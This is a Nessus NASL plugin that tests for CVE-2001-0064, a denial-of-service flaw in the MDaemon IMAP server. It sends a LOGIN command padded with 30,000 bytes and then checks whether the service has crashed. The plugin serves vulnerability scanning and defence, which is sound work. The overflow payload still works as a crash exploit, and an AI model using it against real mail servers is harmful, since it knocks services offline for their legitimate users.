#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from
#  (C) Tenable Network Security
#
#  Ref: Peter <peter.grundl@defcom.com>
#
#  This script is released under the GNU GPL v2


if(description)
{
 script_id(14826);
 script_bugtraq_id(2134);
 script_version ("$Revision: 1.2 $");
 script_cve_id("CVE-2001-0064");
 
 name["english"] = "MDaemon imap server DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running the MDaemon IMAP server.

It is possible to crash the remote version of this softare sending a long
argument to the 'LOGIN' command.

This problem allows an attacker to make the remote service crash, thus 
preventing legitimate users from receiving e-mails.

Solution : Upgrade to the newest version of this software
Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote imap server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
  
 script_copyright(english:"This script is Copyright (C) 2004 David Maciejak");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "sendmail_expn.nasl");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

port = get_kb_item("Services/imap");
if(!port)port = 143;

acct = get_kb_item("imap/login");
pass = get_kb_item("imap/password");

if((acct == "")||(pass == ""))exit(0);

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
    banner = recv_line(socket:soc, length:4096);
    if ("MDaemon" >!< banner ) exit(0);
    s = string("? LOGIN ", acct, " ", pass, " ", crap(30000), "\r\n");
    send(socket:soc, data:s);
    d = recv_line(socket:soc, length:4096);
    close(soc);
  
    soc2 = open_sock_tcp(port);
    if(!soc2)security_hole(port);
    else close(soc2);
 }
}
